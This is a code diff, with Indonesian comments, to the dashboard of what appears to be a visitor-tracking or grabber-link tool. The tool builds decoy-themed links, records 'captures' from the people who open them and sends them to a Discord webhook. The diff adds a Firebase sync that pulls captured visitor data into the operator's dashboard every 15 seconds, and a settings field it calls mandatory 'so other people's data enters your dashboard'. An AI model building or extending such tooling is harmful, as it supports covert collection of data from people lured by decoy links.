@@ -1,5 +1,5 @@
-import { useState } from 'react';
-import { getLinks, createLink, deleteLink, clearLinks, getSettings, saveSettings } from '../storage';
+import { useState, useEffect, useCallback } from 'react';
+import { getLinks, createLink, deleteLink, clearLinks, getSettings, saveSettings, readAllFromFirebase } from '../storage';
 
 const DECOY_THEMES = [
   { key: 'article',  label: 'Artikel' },
@@ -34,6 +34,38 @@ export default function Dashboard() {
   // Gunakan custom domain jika diset di settings, fallback ke Vercel URL
   const base = (settings.customDomain || '').replace(/\/+$/, '') || window.location.origin;
   const totalCaptures = links.reduce((a, l) => a + (l.captures?.length || 0), 0);
+
+  // ─── Sinkronisasi Firebase: tarik data visitor setiap 15 detik ───
+  const syncFirebase = useCallback(async () => {
+    const fbUrl = settings.firebaseUrl;
+    if (!fbUrl) return;
+    const fbData = await readAllFromFirebase(fbUrl); // { linkId: [capture, ...] }
+    if (!Object.keys(fbData).length) return;
+    setLinks(prev => {
+      let changed = false;
+      const updated = prev.map(link => {
+        const fbCaptures = fbData[link.id] || [];
+        if (!fbCaptures.length) return link;
+        // Gabungkan capture lokal + Firebase, hindari duplikat berdasarkan capture.id
+        const existingIds = new Set((link.captures || []).map(c => c.id));
+        const newCaptures = fbCaptures.filter(c => c?.id && !existingIds.has(c.id));
+        if (!newCaptures.length) return link;
+        changed = true;
+        return { ...link, captures: [...(link.captures || []), ...newCaptures] };
+      });
+      if (changed) {
+        // Simpan ke localStorage agar tersimpan permanen
+        import('../storage').then(({ saveLinks }) => saveLinks(updated));
+      }
+      return changed ? updated : prev;
+    });
+  }, [settings.firebaseUrl]);
+
+  useEffect(() => {
+    syncFirebase(); // cek langsung saat load
+    const interval = setInterval(syncFirebase, 15000); // tiap 15 detik
+    return () => clearInterval(interval);
+  }, [syncFirebase]);
 
   function toggleFeat(k) {
     setFeats(p => ({ ...p, [k]: !p[k] }));
@@ -182,6 +214,27 @@ export default function Dashboard() {
                   value={settings.discordWebhook || ''}
                   onChange={e => setSettings(s => ({ ...s, discordWebhook: e.target.value.trim() }))}
                 />
+              </div>
+            </div>
+
+            {/* Firebase — WAJIB agar data visitor masuk dashboard */}
+            <div className="settings-block" style={{ border: '1px solid rgba(34,197,94,0.3)', borderRadius: '10px', padding: '12px', background: 'rgba(34,197,94,0.05)' }}>
+              <div className="settings-block-title" style={{ color: '#22c55e' }}>
+                🔥 Firebase Database
+                <a href="https://console.firebase.google.com/" target="_blank" rel="noreferrer" className="settings-help">
+                  Buat gratis ↗
+                </a>
+              </div>
+              <div className="settings-row">
+                <input
+                  className="settings-input"
+                  placeholder="https://nama-project-default-rtdb.firebaseio.com"
+                  value={settings.firebaseUrl || ''}
+                  onChange={e => setSettings(s => ({ ...s, firebaseUrl: e.target.value.trim() }))}
+                />
+              </div>
+              <div className="settings-hint" style={{ color: '#86efac' }}>
+                ⚡ <strong>Wajib diisi</strong> agar data orang lain masuk ke dashboard kamu secara real-time.
               </div>
             </div>
 
